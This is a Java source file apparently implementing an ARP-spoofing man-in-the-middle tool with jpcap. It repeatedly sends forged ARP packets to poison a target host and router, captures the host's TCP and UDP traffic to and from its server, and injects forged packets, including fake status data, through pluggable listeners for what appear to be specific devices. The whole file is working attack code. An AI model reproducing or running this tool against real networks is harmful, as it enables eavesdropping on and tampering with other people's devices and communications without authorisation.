package Manager;


import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.Properties;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.BrokenBarrierException;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.CyclicBarrier;

import org.omg.CORBA.PUBLIC_MEMBER;

import com.sun.jndi.url.iiopname.iiopnameURLContextFactory;
import com.sun.org.apache.bcel.internal.generic.DUP;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;
import jpcap.packet.UDPPacket;
import Factory.ARPFactory;
import Manager.Listenner.Counter_kerui;
import Manager.Listenner.Counter_yinshi;
import Manager.Listenner.PackageListenner;
import Manager.Strategy.PushUpdata;
import Model.Model_Capture;
import Model.Model_a;
import Model.TestPacketReceiver;
import Util.DealPcap.wireless802_airdump1;
import Util.SetPacket.SetARP;
import Util.SetPacket.SetTCP;

public class Manager_cheatServiceAndHost_3 {
	
	

	final BlockingQueue<Packet> sendQueue = new ArrayBlockingQueue<Packet>(10);
	static Object flag = new Object(); 
	
	//接收抓取的上行数据包，每次抓取到都会更改
	CopyOnWriteArrayList<Packet> pakage_up = new CopyOnWriteArrayList<Packet>();
	
	//接收抓取的上行数据包，每次抓取到都会更改
	CopyOnWriteArrayList<Packet> pakage_down = new CopyOnWriteArrayList<Packet>();
	
	//双线程阻塞工具类
	final  CyclicBarrier cb = new CyclicBarrier(2);
	
	//反制数据队列
	List<Model_a> counter_data_list = new ArrayList<Model_a>();
	
	//暂时未使用
	//反制数据队列(心跳)
	List<Model_a> counter_heart_list_toHost = new ArrayList<Model_a>();
	List<Model_a> counter_heart_list_toService = new ArrayList<Model_a>();
	
	//伪造状态数据
	List<Model_a> fake_status_list_toService = new ArrayList<Model_a>();
	
	
	//所有的监听者
	List<PackageListenner> listenners = new ArrayList<PackageListenner>();
	
	
	//配置文件
	static int ARP_INTERVAL;
	static int NETCARD_INDEX;
	
	static String HOST_IP;
	static String SERVICE_IP;
	static String ROUTE_IP;
	
	static String YOUR_DEVICE_MAC;
	static String TARGET_HOST_MAC;
	static String TARGET_ROUTE_MAC;
	
	static String[] LISTENNER_DEVICES; 
	
	{
		readProperties();
		
	}
	
	
	
	/*************************************************
	 * 主函数，测试使用
	 *************************************************/	
	public static void main(String[] args) {
		
		Manager_cheatServiceAndHost_3 mc= new Manager_cheatServiceAndHost_3();
		
		JpcapSender js = getCrad(NETCARD_INDEX,null);
		
		//获取发送数据包的网卡
		
		/*************************************************
		 * 从抓取的数据包获得反制数据队列
		 *************************************************/
		mc.recognazion_command();
		
		/*************************************************
		 * 伪造ARP数据，添加到待发送列表中
		 *************************************************/                                                       
		mc.setARPs(HOST_IP,ROUTE_IP,YOUR_DEVICE_MAC,TARGET_HOST_MAC,null);
		
		
		/************************************************* 
		 * 启动发包线程，检查发包列表，需要不停的发送
		 *************************************************/
		mc.sentThread(js);
		
		/*************************************************
		 * ARP欺骗成功后，开始捕获主机发送的数据放入到cpmodel中,
		 * 并且计算出伪造数据加入到发送列表
		 *************************************************/
		mc.capPacket_run(NETCARD_INDEX,HOST_IP,SERVICE_IP,YOUR_DEVICE_MAC);
		
		
		/*************************************************
		 * 选择模式，进入伪造线程，开始伪造数据,并添加到待发送列表
		 * 模式一：只转发数据
		 * 模式二：拦截主机和服务器的数据，并且发送伪造与主机的通信
		 *************************************************/
		mc.fakeThread(2,YOUR_DEVICE_MAC,TARGET_HOST_MAC,TARGET_ROUTE_MAC,HOST_IP);
		
	}
	
	
	/*************************************************
	 * 启动函数,为其他类调用时提供接口
	 *************************************************/
	public void start(){
		
		//获取发送数据包的网卡
		JpcapSender js = getCradByMAC("");
		
		//获取发送数据包的网卡
		
		/*************************************************
		 * 从抓取的数据包获得反制数据队列
		 *************************************************/
		recognazion_command();
		
		/*************************************************
		 * 伪造ARP数据，添加到待发送列表中
		 *************************************************/                                                       
		setARPs(HOST_IP,ROUTE_IP,YOUR_DEVICE_MAC,TARGET_HOST_MAC,null);
		
		
		/************************************************* 
		 * 启动发包线程，检查发包列表，需要不停的发送
		 *************************************************/
	     sentThread(js);
		
		/*************************************************
		 * ARP欺骗成功后，开始捕获主机发送的数据放入到cpmodel中,
		 * 并且计算出伪造数据加入到发送列表
		 *************************************************/
		capPacket_runByMAC("",HOST_IP,SERVICE_IP,YOUR_DEVICE_MAC);
		
		
		/*************************************************
		 * 选择模式，进入伪造线程，开始伪造数据,并添加到待发送列表
		 * 模式一：只转发数据
		 * 模式二：拦截主机和服务器的数据，并且发送伪造与主机的通信
		 *************************************************/
		fakeThread(2,YOUR_DEVICE_MAC,TARGET_HOST_MAC,TARGET_ROUTE_MAC,HOST_IP);
	}
	
	
	/*************************************************
	 * end
	 *************************************************/
	
	
	/*************************************************
	 * 从抓取的数据包中识别出反制数据队列
	 *************************************************/
	public void recognazion_command(){
		Runnable run = new Runnable() {
			
			@Override
			public void run() {
				
				
				if(LISTENNER_DEVICES.length!=0 && !LISTENNER_DEVICES[0].equals("")){
					
					for(String device:LISTENNER_DEVICES){
						
						try {
							
							listenners.add((PackageListenner)( Class.forName(device).getConstructor(BlockingQueue.class).newInstance(sendQueue) ));
							
						} catch (InstantiationException
								| IllegalAccessException
								| IllegalArgumentException
								| InvocationTargetException
								| NoSuchMethodException | SecurityException
								| ClassNotFoundException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
							
						
					}
					System.out.println("反制设备添加成功:"+listenners.size());
					
				}
				
				
					/*PackageListenner kerui = new Counter_kerui(sendQueue);
					PackageListenner yinshi = new Counter_yinshi(sendQueue);
					listenners.add(kerui);
					listenners.add(yinshi);*/
				
					try {
						cb.await();
					} catch (InterruptedException | BrokenBarrierException e){
						e.printStackTrace();
					}
					
					
			}
		};
		
		System.out.println("开始创建反制队列");
		new Thread(run).start();
	}
	/*************************************************
	 * end
	 *************************************************/
	
	
	/*************************************************
	 * 抓包线程第一个参数是网卡序号，后面是主机IP和服务器IP,根据MAC地址
	 *************************************************/
	public  void capPacket_runByMAC(String mac,final String host_ip, final String service_ip ,final String yourMAC){
	    
	       try{    
	            //获取本机上的网络接口对象数组    
	     final  NetworkInterface[] devices = JpcapCaptor.getDeviceList(); 
	     NetworkInterface nc = null;
	     for(int i=0;i<devices.length;i++){
	    	 
	    	 if(bytesToHexString(devices[i].mac_address).equals(mac)){
	    		 nc = devices[i];
	    		 break;
	    	 }
	    	 
	     }
	        //创建某个卡口上的抓取对象,设置最大一次性抓包大小为2000byte
	        final JpcapCaptor jpcap = JpcapCaptor.openDevice(nc, 2000, true, 20); 
	        jpcap.setFilter("ip and tcp", true);
	        
	         Runnable run = new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					System.out.println("启动抓包线程");
					//是否每一次需要不同的Pr
					TestPacketReceiver pr = new TestPacketReceiver(host_ip,yourMAC);
					while(true){
						startCapThread(jpcap,host_ip,service_ip,pr);
					}	
				}
			};
			
			new Thread(run).start();
	            
	        System.out.println("准备获取"+mac+"上的数据");    
  
	        }catch(Exception ef){    
	            ef.printStackTrace();    
	            System.out.println("启动失败:  "+ef);    
	        }      
	   }
	
	
	/*************************************************
	 * 抓包线程第一个参数是网卡序号，后面是主机IP和服务器IP
	 *************************************************/
	public  void capPacket_run(int i,final String host_ip, final String service_ip ,final String yourMAC){
	    
	       try{    
	            //获取本机上的网络接口对象数组    
	     final  NetworkInterface[] devices = JpcapCaptor.getDeviceList();    
	            
	        NetworkInterface nc=devices[i];    
	        //创建某个卡口上的抓取对象,设置最大一次性抓包大小为2000byte
	        final JpcapCaptor jpcap = JpcapCaptor.openDevice(nc, 2000, true, 20); 
	        jpcap.setFilter("ip and tcp", true);
	        
	         Runnable run = new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					System.out.println("启动抓包线程");
					//是否每一次需要不同的Pr
					TestPacketReceiver pr = new TestPacketReceiver(host_ip,yourMAC);
					while(true){
						startCapThread(jpcap,host_ip,service_ip,pr);
					}	
				}
			};
			
			new Thread(run).start();
	            
	        System.out.println("准备获取第"+i+"个卡口上的数据");    
  
	        }catch(Exception ef){    
	            ef.printStackTrace();    
	            System.out.println("启动失败:  "+ef);    
	        }      
	   }
	    //将Captor放到独立线程中运行    
	   public  void startCapThread(final JpcapCaptor jpcap,final String host_ip,final String service_ip,TestPacketReceiver pr){    
	       //JpcapCaptor jp=jpcap;    
    	  // while(true){}    
  		 //使用接包处理器循环抓包-1表示无限制的抓取数据包   "192.168.8.101","119.29.42.117"
  		  jpcap.loopPacket(1, pr);
  		  
  		  if(pr.getPacket() != null){

  			  Packet packet = pr.getPacket();
  			  //TCP帧 
  			  if(packet instanceof jpcap.packet.TCPPacket){
  				  TCPPacket tcpPacket = (TCPPacket)packet;
  				  
  				  if(tcpPacket.syn){
  					  
  					  System.out.println("握手帧......更新cpmodel失败");
  					  	
  				  }
  				  //&&service_ip.equals(tcpPacket.dst_ip.getHostAddress())
  				//上行数据
  				  else if(host_ip.equals(tcpPacket.src_ip.getHostAddress())){
  					  if(pakage_up.size() == 0){
  						
  						 pakage_up.add(tcpPacket);
  						 System.out.println("上行TCP数据");
  						 System.out.println("packet_up初始化成功");
  					  }
  					  else{
  						  TCPPacket packet2 = (TCPPacket) pakage_up.get(0);
  						  if(packet2.ack_num == tcpPacket.ack_num&&packet2.sequence == tcpPacket.sequence&&packet2.data.length==tcpPacket.data.length){
  							
  							 // System.out.println("重复帧，未更新packet_up");
  						  }else{
  							  
  							  pakage_up.set(0, tcpPacket);
  							  System.out.println("上行TCP数据");
  							  System.out.println("新TCP数据，更新packet_up");
  						  }
  						  
  					  }
  					  
  				  }
  				  //&&service_ip.equals(tcpPacket.src_ip.getHostAddress())
  				//下行行数据
  				  else if(host_ip.equals(tcpPacket.dst_ip.getHostAddress())){
  					  if(pakage_down.size() == 0){
  						  pakage_down.add(tcpPacket);
  						 System.out.println("下行TCP数据");
  						  System.out.println("packet_down初始化");
  					  }
  					  else{
  						  TCPPacket packet2 = (TCPPacket) pakage_down.get(0); 
  						  if(packet2.ack_num == tcpPacket.ack_num&&packet2.sequence == tcpPacket.sequence&&packet2.data.length==tcpPacket.data.length){
  							  
  							  //System.out.println("重复帧，未更新packet_down");
  						  }else{
  							  pakage_down.set(0, tcpPacket);
  							 System.out.println("下行TCP数据");
  							  System.out.println("新TCP数据，更新packet_down");
  							  
  						  }	  
  					  }
  				  }
  			  }	  
  			  
  			  else if(packet instanceof UDPPacket){
  				  //udp数据包不用提前处理
  				  
  				  UDPPacket udpPacket = (UDPPacket)packet;
  				  
  				  if(host_ip.equals(udpPacket.src_ip.getHostAddress())){
  					  
  					  System.out.println("上行UDP数据");
  					  if(pakage_up.size()==0){
  						 
  						  pakage_up.set(0, udpPacket);
  						System.out.println("packet_up初始化成功");
  						
  					  }
  					  else {
  						 pakage_up.set(0, udpPacket);
  						System.out.println("新UDP数据，更新packet_up");
					}
  					  
  				  }
  				  else if(host_ip.equals(udpPacket.dst_ip.getHostAddress())) {
  					  System.out.println("下行UDP数据");
  					  if(pakage_down.size()==0){
  						  pakage_down.set(0, udpPacket);
  						System.out.println("packet_down初始化成功");
  						
  					  }
  					  else {
  						 pakage_down.set(0, udpPacket);
  						System.out.println("新UDP数据，更新packet_down");
					}
  				  }
  				  
  				  
  			  }
  			  
  		  }  
  	   
       
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	 /*************************************************
	 * 发包线程
	 *************************************************/
	   public void sentThread(final JpcapSender js){
		   
		   java.lang.Runnable runner = new Runnable(){

				@Override
				public void run() {
					
					try {
						//不停的发包
						while(true){
							if(js != null){
									
								Packet packet = sendQueue.take();
								if(packet instanceof jpcap.packet.ARPPacket){
									
									System.out.println("sending arp.."); 
									
								}
								if(packet instanceof jpcap.packet.TCPPacket){
									
									TCPPacket tcpPacket = (TCPPacket)packet;
									System.out.println("sending TCPtohost.."+"seq|"+tcpPacket.sequence+
														" ack|"+tcpPacket.ack_num);
								}
								if(packet instanceof jpcap.packet.UDPPacket){
									
									UDPPacket udp = (UDPPacket) packet;
									System.out.println("sending UDP...."+"  lenth:"+udp.data.length);
								}
								
								js.sendPacket(packet);
							}
							
						}
					} catch (Exception e) {
						System.out.println("发送数据线程出错");
						e.printStackTrace();
					}
				}
				
			};
			
			Thread senThread = new Thread(runner);
			senThread.start();
			//new Thread(runner).start();
		   System.out.println("发包线程启动");
		   
	   } 
	 /*************************************************
	 * end
	 *************************************************/
	   
	 /*************************************************
	 * ARPs设置
	 *************************************************/
	   public  void setARPs(String hostIP,String routeIP,String yourMAC,String deviceMAC,String routeMAC){
		  
		   ARPFactory arpFactory = null;
		   if(routeMAC == null){
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC);
		   }else{
			   
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC, routeMAC);
		   }
		  
		   final ARPFactory arpFactory1 = arpFactory;
		  Runnable run = new Runnable() {
			
			@Override
			public void run() {
				Set<ARPPacket> ARPs = null;
				Iterator<ARPPacket> it = null;
				while(true){
					ARPs = arpFactory1.getInstance();
					it = ARPs.iterator();
					//把arp加入发送队列
					while(it.hasNext()){
						try {
							sendQueue.put(it.next());
						} catch (InterruptedException e) {
							e.printStackTrace();
						}	
					}
					//每生产一次停止指定的时间ARP_INTERVAL
					try {
						Thread.sleep(ARP_INTERVAL);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
		  };
		  
		  
		  new Thread(run).start();
		  
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	  /*************************************************
	 * 伪造数据包线程,分为多种模式
	 *************************************************/
	  public  void fakeThread(int flags,final String  yourMAC,final String hostMAC,final String rounteMAC,final String host_ip){
		   
		   //模式一为直接转发接收到的数据

		   //模式2为拦截对方数据,转发自己伪造的数据
		    //if(flag == 2){
			   java.lang.Runnable runner = new  Runnable() {
				   public void run() {
					  // System.out.println("进入到伪造线程1");
					  // int step = 0;
					   try {
							  //等待反制队列创建成功
							cb.await();
						} catch (InterruptedException | BrokenBarrierException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					   
					   Packet packet_up = null;
					   Packet packet_down = null;
					   
					   PushUpdata pushUpdata = new PushUpdata(yourMAC, hostMAC, rounteMAC, host_ip);
					   
					   if(listenners.size()!=0){
						   for(PackageListenner listenner : listenners){
							   
							   pushUpdata.addListenner(listenner);
							
						   }
						   
					   }
					   
					  while(true){	
						  	//与主机设备的反制通信
						  if(pakage_up.size() != 0){
							  //fake(packet_up, pakage_up, yourMAC, hostMAC, rounteMAC);
							 packet_up =  pushUpdata.pushAfterDeal(packet_up, pakage_up.get(0));
						  }
 
						  //与服务其的反制通信
						  if(pakage_down.size() != 0){
							 // fake(packet_down, pakage_down, yourMAC, hostMAC, rounteMAC);
							 packet_down =  pushUpdata.pushAfterDeal(packet_down, pakage_down.get(0));
						  }
					 }
				   }
			   };  
			   
			   Thread fakeThread = new Thread(runner);
			   fakeThread.start();
		   //}
		    
	   }
	   /*************************************************
	   * end
	   *************************************************/
	  
	   /*************************************************
	   * 获取用来发送数据的网卡
	   *************************************************/
		public static JpcapSender getCrad(int deviceNum,String NetCard_MAC){
				  
					NetworkInterface[] devices = null;
					 try{    
						 //获取本机上的网络接口对象数组    
						  devices = JpcapCaptor.getDeviceList();
System.out.println("网卡获取成功  ");  
						 }catch(Exception ef){    
						            ef.printStackTrace();    
System.out.println("显示网络接口数据失败:  "+ef);    
						    }  
					 
					JpcapSender js = null;
					
					try {
						js = JpcapSender.openDevice(devices[deviceNum]);
System.out.println("已获取网卡(发送使用)  "+deviceNum+"  JSender建立成功");  				
					} catch (IOException e1) {
System.out.println("JSender建立不成功");
						e1.printStackTrace();
					}
					  
				  return js;
			  } 
			  /*************************************************
			 * end
			 *************************************************/
		
		/*************************************************
		 * 字节数组转换
		 *************************************************/
		public static String  bytesToHexString(byte[] src){  
		    StringBuilder stringBuilder = new StringBuilder("");  
		    if (src == null || src.length <= 0) {  
		        return null;  
		    }  
		    for (int i = 0; i < src.length; i++) {  
		        int v = src[i] & 0xFF;  
		        String hv = Integer.toHexString(v);  
		        if (hv.length() < 2) {  
		            stringBuilder.append(0);  
		        }  
		        stringBuilder.append(hv);  
		    }  
		    return stringBuilder.toString();  
		} 
		
		
		/*************************************************
		 * end
		 *************************************************/
		
		
		/*************************************************
		   * 获取用来发送数据的网卡------根据MAC地址
		   *************************************************/
			public static JpcapSender getCradByMAC(String mac){
					  
						NetworkInterface[] devices = null;
						 try{    
							 //获取本机上的网络接口对象数组    
							  devices = JpcapCaptor.getDeviceList();
	System.out.println("网卡获取成功  ");  
							 }catch(Exception ef){    
							            ef.printStackTrace();    
	System.out.println("显示网络接口数据失败:  "+ef);    
							    }  
						JpcapSender js = null;
						
						for(int i = 0 ;i<devices.length;i++){
							if(bytesToHexString(devices[i].mac_address).equals(mac)){
								
								try {
									js = JpcapSender.openDevice(devices[i]);
			System.out.println("已获取网卡(发送使用)  "+i+"   mac:"+ mac+"  JSender建立成功");  				
								} catch (IOException e1) {
			System.out.println("JSender建立不成功");
									e1.printStackTrace();
								}
								break;
							}
						}
					  return js;
				  } 
				  /*************************************************
				 * end
				 *************************************************/
		
		
		
		
		/*************************************************
		 * 读取配置文件prameter.properties
		 *************************************************/
		  public void readProperties(){
			  	
				Properties prop = new Properties();
				InputStream in = Object. class .getResourceAsStream( "/counterProperties.properties" );    
		        try  {    
		           prop.load(in);    
		 
		           ARP_INTERVAL = Integer.parseInt(prop.getProperty( "ARP_INTERVAL" ).trim()); 
		           NETCARD_INDEX = Integer.parseInt(prop.getProperty( "NETCARD_INDEX" ).trim());
		           HOST_IP = prop.getProperty( "HOST_IP" ).trim();
		           if(!prop.getProperty( "SERVICE_IP" ).trim().equals("")){
		        	   SERVICE_IP = prop.getProperty( "SERVICE_IP" ).trim();  
		           }else {
		        	   SERVICE_IP = null;
				}
		           
		           ROUTE_IP = prop.getProperty( "ROUTE_IP" ).trim();
		           YOUR_DEVICE_MAC = prop.getProperty( "YOUR_DEVICE_MAC" ).trim();
		           TARGET_HOST_MAC = prop.getProperty( "TARGET_HOST_MAC" ).trim();
		           TARGET_ROUTE_MAC = prop.getProperty( "TARGET_ROUTE_MAC" ).trim();
		           LISTENNER_DEVICES =  prop.getProperty( "LISTENNER_DEVICES" ).trim().split(",");
		           
		           
		           /*
		           String[] ss1  =  prop.getProperty( "INT_INDEX" ).trim().split(",");
		           if(ss1.length != 0){ 
		        	   INT_INDEX = new int[ss1.length];
		        	   for(int i = 0;i<ss1.length;i++){  
			        	   INT_INDEX[i] = Integer.parseInt(ss1[i]);
			           } 
		           }
		           
		           
		           String[] ss2 =  prop.getProperty( "HEART_INDEX_UP" ).trim().split(",");
		           if(!ss2[0].equals("")){ 
		        	   HEART_INDEX_UP = new int[ss2.length];
		        	   for(int i = 0;i<ss2.length;i++){  
		        		   HEART_INDEX_UP[i] = Integer.parseInt(ss2[i]);
			           } 
		           }
		           
		           String[] ss3 =  prop.getProperty( "HEART_INDEX_DOWN" ).trim().split(",");
		      
		           if(!ss3[0].equals("")){ 
		        	   HEART_INDEX_DOWN = new int[ss3.length];
		        	   for(int i = 0;i<ss3.length;i++){  
		        		   HEART_INDEX_DOWN[i] = Integer.parseInt(ss3[i]);
			           } 
		           }
		           
		           
		           String[] ss4 =  prop.getProperty( "STATUS_INDEX_TOSERVICE" ).trim().split(",");
				      
		           if(!ss4[0].equals("")){ 
		        	   STATUS_INDEX_TOSERVICE = new int[ss4.length];
		        	   for(int i = 0;i<ss4.length;i++){  
		        		   STATUS_INDEX_TOSERVICE[i] = Integer.parseInt(ss4[i]);
			           } 
		           }*/
		           
		       }  catch  (IOException e) {    
		           e.printStackTrace();    
		       }  
		         
		        
		        /*
		        File fileB = new File( this.getClass().getResource( "" ).getPath());  
		        
		        System. out .println( "fileB path: " + fileB);*/  
		  }
		  /*************************************************
		 * end
		 *************************************************/
}    